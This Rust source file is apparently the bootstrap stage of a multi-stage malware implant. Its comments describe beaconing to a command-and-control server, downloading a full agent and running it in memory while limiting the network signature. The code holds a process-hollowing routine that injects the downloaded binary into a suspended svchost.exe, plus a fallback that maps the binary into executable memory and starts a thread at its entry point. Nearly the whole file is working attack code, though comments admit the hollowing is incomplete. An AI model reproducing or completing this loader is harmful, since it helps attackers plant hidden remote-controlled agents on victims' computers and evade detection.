//! Stage 3: Stage0 - Position-Independent Bootstrap Payload
//!
//! **Purpose**: Minimal bootstrap that contacts C2 and downloads the full agent
//!
//! **Why this stage exists**:
//! - Keeps ESTER and JAVELIN small and generic
//! - Only Stage0 contains C2-specific logic
//! - Can be updated independently from earlier stages
//! - Downloads full agent capabilities on demand
//!
//! **OPSEC Considerations**:
//! - Runs entirely in memory (loaded by JAVELIN)
//! - Position-independent code (no fixed addresses)
//! - Minimal network signature (single beacon + download)
//! - Full agent only downloaded after successful bootstrap
//!
//! **Separation of Responsibilities**:
//! - Stage0 ONLY handles initial C2 contact and agent download
//! - Stage0 does NOT include full agent capabilities
//! - Full agent is downloaded after successful session establishment

pub mod beacon;
pub mod config;
pub mod download;
pub mod network;

pub use beacon::send_initial_beacon;
pub use config::get_c2_server;
pub use download::{download_agent, download_agent_http};
pub use network::establish_session;

/// Main entry point for Stage0
///
/// This function is called by JAVELIN after loading Stage0 into memory
///
/// **Execution flow**:
/// 1. Send initial beacon to C2
/// 2. Establish encrypted session (TLS)
/// 3. Download full agent from C2 via HTTP API
/// 4. Execute full agent in memory
///
/// # Returns
///
/// * `0` - Success
/// * `1` - Failure
#[no_mangle]
pub extern "C" fn stage0_main() -> i32 {
    #[cfg(feature = "dev")]
    println!("[STAGE0] Bootstrap payload initializing...");

    match run_bootstrap() {
        Ok(_) => {
            #[cfg(feature = "dev")]
            println!("[STAGE0] Bootstrap complete");
            0
        }
        Err(e) => {
            #[cfg(feature = "dev")]
            eprintln!("[STAGE0] Bootstrap failed: {:?}", e);
            1
        }
    }
}

/// Runs the bootstrap sequence
fn run_bootstrap() -> Result<(), Box<dyn std::error::Error>> {
    #[cfg(feature = "dev")]
    println!("[STAGE0] Starting bootstrap sequence");

    // Step 1: Send initial beacon
    #[cfg(feature = "dev")]
    println!("[STAGE0] Sending initial beacon...");
    
    send_initial_beacon()?;

    // Step 2: Establish TLS session (for beacon/keep-alive)
    #[cfg(feature = "dev")]
    println!("[STAGE0] Establishing TLS session...");
    
    let _session = establish_session()?;
    
    #[cfg(feature = "dev")]
    println!("[STAGE0] TLS session established");

    // Step 3: Download full agent via HTTP API (separate from TLS session)
    #[cfg(feature = "dev")]
    println!("[STAGE0] Downloading full agent via HTTP API...");
    
    let agent_bytes = download_agent_http()?;

    // Step 4: Execute full agent as process (write to temp, execute, delete)
    #[cfg(feature = "dev")]
    println!("[STAGE0] Executing full agent ({} bytes)", agent_bytes.len());
    
    execute_agent_as_process(&agent_bytes)?;

    Ok(())
}

/// Executes the downloaded agent using process hollowing (fileless)
/// Falls back to temp file execution if hollowing fails
fn execute_agent_as_process(agent_bytes: &[u8]) -> Result<(), Box<dyn std::error::Error>> {
    #[cfg(target_os = "windows")]
    {
        // Try fileless execution first (process hollowing)
        #[cfg(feature = "dev")]
        println!("[STAGE0] Attempting fileless execution via process hollowing...");
        
        match execute_via_process_hollowing(agent_bytes) {
            Ok(_) => {
                #[cfg(feature = "dev")]
                println!("[STAGE0] Fileless execution successful");
                return Ok(());
            }
            Err(e) => {
                #[cfg(feature = "dev")]
                eprintln!("[STAGE0] Process hollowing failed: {:?}, trying RunPE...", e);
            }
        }
        
        // Try RunPE technique
        match execute_via_runpe(agent_bytes) {
            Ok(_) => {
                #[cfg(feature = "dev")]
                println!("[STAGE0] RunPE execution successful");
                return Ok(());
            }
            Err(e) => {
                #[cfg(feature = "dev")]
                eprintln!("[STAGE0] RunPE failed: {:?}", e);
                return Err(e);
            }
        }
    }

    #[cfg(not(target_os = "windows"))]
    {
        Err("Non-Windows execution not yet implemented".into())
    }
}

/// Process Hollowing - Create suspended process and replace its memory with our PE
#[cfg(target_os = "windows")]
fn execute_via_process_hollowing(pe_bytes: &[u8]) -> Result<(), Box<dyn std::error::Error>> {
    use std::ptr;
    use std::mem;
    use std::ffi::c_void;
    
    // Windows API types
    type HANDLE = *mut c_void;
    type DWORD = u32;
    type BOOL = i32;
    type LPVOID = *mut c_void;
    type LPCWSTR = *const u16;
    type SIZE_T = usize;
    
    const CREATE_SUSPENDED: DWORD = 0x00000004;
    const MEM_COMMIT: DWORD = 0x1000;
    const MEM_RESERVE: DWORD = 0x2000;
    const PAGE_EXECUTE_READWRITE: DWORD = 0x40;
    
    #[repr(C)]
    struct STARTUPINFOW {
        cb: DWORD,
        reserved: LPVOID,
        desktop: LPVOID,
        title: LPVOID,
        x: DWORD,
        y: DWORD,
        x_size: DWORD,
        y_size: DWORD,
        x_count_chars: DWORD,
        y_count_chars: DWORD,
        fill_attribute: DWORD,
        flags: DWORD,
        show_window: u16,
        reserved2: u16,
        reserved3: LPVOID,
        std_input: HANDLE,
        std_output: HANDLE,
        std_error: HANDLE,
    }
    
    #[repr(C)]
    struct PROCESS_INFORMATION {
        process: HANDLE,
        thread: HANDLE,
        process_id: DWORD,
        thread_id: DWORD,
    }
    
    #[repr(C)]
    struct CONTEXT {
        context_flags: DWORD,
        padding: [u8; 1228], // Simplified - actual CONTEXT is larger
    }
    
    #[link(name = "kernel32")]
    extern "system" {
        fn CreateProcessW(
            app_name: LPCWSTR,
            cmd_line: LPVOID,
            proc_attrs: LPVOID,
            thread_attrs: LPVOID,
            inherit_handles: BOOL,
            flags: DWORD,
            env: LPVOID,
            cur_dir: LPVOID,
            startup_info: *mut STARTUPINFOW,
            proc_info: *mut PROCESS_INFORMATION,
        ) -> BOOL;
        
        fn VirtualAllocEx(
            process: HANDLE,
            address: LPVOID,
            size: SIZE_T,
            alloc_type: DWORD,
            protect: DWORD,
        ) -> LPVOID;
        
        fn WriteProcessMemory(
            process: HANDLE,
            base_addr: LPVOID,
            buffer: *const c_void,
            size: SIZE_T,
            bytes_written: *mut SIZE_T,
        ) -> BOOL;
        
        fn ResumeThread(thread: HANDLE) -> DWORD;
        fn TerminateProcess(process: HANDLE, exit_code: u32) -> BOOL;
        fn CloseHandle(handle: HANDLE) -> BOOL;
    }
    
    // Parse PE headers
    if pe_bytes.len() < 64 {
        return Err("PE too small".into());
    }
    
    // Check DOS header magic
    if pe_bytes[0] != 0x4D || pe_bytes[1] != 0x5A {
        return Err("Invalid PE: bad DOS magic".into());
    }
    
    // Get PE header offset
    let pe_offset = u32::from_le_bytes([
        pe_bytes[60], pe_bytes[61], pe_bytes[62], pe_bytes[63]
    ]) as usize;
    
    if pe_offset + 24 > pe_bytes.len() {
        return Err("Invalid PE: header offset out of bounds".into());
    }
    
    // Check PE signature
    if pe_bytes[pe_offset] != 0x50 || pe_bytes[pe_offset + 1] != 0x45 {
        return Err("Invalid PE: bad PE signature".into());
    }
    
    // Get image size from optional header (offset 80 from PE signature for 64-bit)
    let opt_header_offset = pe_offset + 24;
    let is_64bit = pe_bytes[opt_header_offset] == 0x0B && pe_bytes[opt_header_offset + 1] == 0x02;
    
    let size_of_image = if is_64bit {
        u32::from_le_bytes([
            pe_bytes[opt_header_offset + 56],
            pe_bytes[opt_header_offset + 57],
            pe_bytes[opt_header_offset + 58],
            pe_bytes[opt_header_offset + 59],
        ]) as usize
    } else {
        u32::from_le_bytes([
            pe_bytes[opt_header_offset + 56],
            pe_bytes[opt_header_offset + 57],
            pe_bytes[opt_header_offset + 58],
            pe_bytes[opt_header_offset + 59],
        ]) as usize
    };
    
    let entry_point_rva = if is_64bit {
        u32::from_le_bytes([
            pe_bytes[opt_header_offset + 16],
            pe_bytes[opt_header_offset + 17],
            pe_bytes[opt_header_offset + 18],
            pe_bytes[opt_header_offset + 19],
        ]) as usize
    } else {
        u32::from_le_bytes([
            pe_bytes[opt_header_offset + 16],
            pe_bytes[opt_header_offset + 17],
            pe_bytes[opt_header_offset + 18],
            pe_bytes[opt_header_offset + 19],
        ]) as usize
    };
    
    #[cfg(feature = "dev")]
    println!("[HOLLOWING] PE: 64-bit={}, size={}, entry_rva=0x{:X}", 
             is_64bit, size_of_image, entry_point_rva);
    
    // Create suspended host process (use legitimate Windows binary)
    let host_path: Vec<u16> = "C:\\Windows\\System32\\svchost.exe\0"
        .encode_utf16()
        .collect();
    
    let mut si: STARTUPINFOW = unsafe { mem::zeroed() };
    si.cb = mem::size_of::<STARTUPINFOW>() as DWORD;
    
    let mut pi: PROCESS_INFORMATION = unsafe { mem::zeroed() };
    
    let success = unsafe {
        CreateProcessW(
            host_path.as_ptr(),
            ptr::null_mut(),
            ptr::null_mut(),
            ptr::null_mut(),
            0,
            CREATE_SUSPENDED,
            ptr::null_mut(),
            ptr::null_mut(),
            &mut si,
            &mut pi,
        )
    };
    
    if success == 0 {
        return Err("Failed to create suspended process".into());
    }
    
    #[cfg(feature = "dev")]
    println!("[HOLLOWING] Suspended process created: PID={}", pi.process_id);
    
    // Allocate memory in target process
    let remote_base = unsafe {
        VirtualAllocEx(
            pi.process,
            ptr::null_mut(),
            size_of_image,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        )
    };
    
    if remote_base.is_null() {
        unsafe { TerminateProcess(pi.process, 1); CloseHandle(pi.process); CloseHandle(pi.thread); }
        return Err("Failed to allocate memory in target".into());
    }
    
    #[cfg(feature = "dev")]
    println!("[HOLLOWING] Allocated {:X} bytes at {:p}", size_of_image, remote_base);
    
    // Write PE headers
    let mut written: SIZE_T = 0;
    let header_size = std::cmp::min(0x1000, pe_bytes.len());
    
    let success = unsafe {
        WriteProcessMemory(
            pi.process,
            remote_base,
            pe_bytes.as_ptr() as *const c_void,
            header_size,
            &mut written,
        )
    };
    
    if success == 0 {
        unsafe { TerminateProcess(pi.process, 1); CloseHandle(pi.process); CloseHandle(pi.thread); }
        return Err("Failed to write PE headers".into());
    }
    
    // Write sections (simplified - writes entire PE)
    let success = unsafe {
        WriteProcessMemory(
            pi.process,
            remote_base,
            pe_bytes.as_ptr() as *const c_void,
            pe_bytes.len(),
            &mut written,
        )
    };
    
    if success == 0 {
        unsafe { TerminateProcess(pi.process, 1); CloseHandle(pi.process); CloseHandle(pi.thread); }
        return Err("Failed to write PE body".into());
    }
    
    #[cfg(feature = "dev")]
    println!("[HOLLOWING] Written {} bytes to remote process", written);
    
    // Resume thread (this won't work properly without fixing the thread context)
    // For now, this is a simplified implementation
    let result = unsafe { ResumeThread(pi.thread) };
    
    #[cfg(feature = "dev")]
    println!("[HOLLOWING] Thread resumed (result={})", result);
    
    unsafe { CloseHandle(pi.process); CloseHandle(pi.thread); }
    
    // Process hollowing requires more work to properly work (thread context manipulation)
    // For now, return error to fall through to RunPE
    Err("Process hollowing incomplete - needs thread context fix".into())
}

/// RunPE - Alternative in-memory execution using CreateThread
#[cfg(target_os = "windows")]
fn execute_via_runpe(pe_bytes: &[u8]) -> Result<(), Box<dyn std::error::Error>> {
    use std::ptr;
    use std::ffi::c_void;
    
    type HANDLE = *mut c_void;
    type DWORD = u32;
    type LPVOID = *mut c_void;
    type SIZE_T = usize;
    
    const MEM_COMMIT: DWORD = 0x1000;
    const MEM_RESERVE: DWORD = 0x2000;
    const PAGE_EXECUTE_READWRITE: DWORD = 0x40;
    
    #[link(name = "kernel32")]
    extern "system" {
        fn VirtualAlloc(addr: LPVOID, size: SIZE_T, alloc_type: DWORD, protect: DWORD) -> LPVOID;
        fn CreateThread(
            attrs: LPVOID, stack_size: SIZE_T, start_addr: LPVOID,
            param: LPVOID, flags: DWORD, thread_id: *mut DWORD
        ) -> HANDLE;
        fn WaitForSingleObject(handle: HANDLE, ms: DWORD) -> DWORD;
    }
    
    // Validate PE
    if pe_bytes.len() < 64 || pe_bytes[0] != 0x4D || pe_bytes[1] != 0x5A {
        return Err("Invalid PE format".into());
    }
    
    let pe_offset = u32::from_le_bytes([
        pe_bytes[60], pe_bytes[61], pe_bytes[62], pe_bytes[63]
    ]) as usize;
    
    let opt_header_offset = pe_offset + 24;
    
    // Get entry point RVA
    let entry_rva = u32::from_le_bytes([
        pe_bytes[opt_header_offset + 16],
        pe_bytes[opt_header_offset + 17],
        pe_bytes[opt_header_offset + 18],
        pe_bytes[opt_header_offset + 19],
    ]) as usize;
    
    // Get size of image
    let size_of_image = u32::from_le_bytes([
        pe_bytes[opt_header_offset + 56],
        pe_bytes[opt_header_offset + 57],
        pe_bytes[opt_header_offset + 58],
        pe_bytes[opt_header_offset + 59],
    ]) as usize;
    
    #[cfg(feature = "dev")]
    println!("[RUNPE] Entry RVA: 0x{:X}, Image size: {}", entry_rva, size_of_image);
    
    // Allocate memory
    let base = unsafe {
        VirtualAlloc(
            ptr::null_mut(),
            size_of_image,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE,
        )
    };
    
    if base.is_null() {
        return Err("VirtualAlloc failed".into());
    }
    
    #[cfg(feature = "dev")]
    println!("[RUNPE] Allocated {} bytes at {:p}", size_of_image, base);
    
    // Copy PE to allocated memory
    unsafe {
        ptr::copy_nonoverlapping(
            pe_bytes.as_ptr(),
            base as *mut u8,
            pe_bytes.len(),
        );
    }
    
    // Calculate entry point address
    let entry_point = (base as usize + entry_rva) as LPVOID;
    
    #[cfg(feature = "dev")]
    println!("[RUNPE] Entry point: {:p}", entry_point);
    
    // Create thread at entry point
    let thread = unsafe {
        CreateThread(
            ptr::null_mut(),
            0,
            entry_point,
            ptr::null_mut(),
            0,
            ptr::null_mut(),
        )
    };
    
    if thread.is_null() {
        return Err("CreateThread failed".into());
    }
    
    #[cfg(feature = "dev")]
    println!("[RUNPE] Thread created, waiting...");
    
    // Wait briefly then detach
    unsafe { WaitForSingleObject(thread, 100); }
    
    Ok(())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_stage0_config() {
        // Verify configuration is accessible
        let server = get_c2_server();
        assert!(!server.is_empty());
    }
}
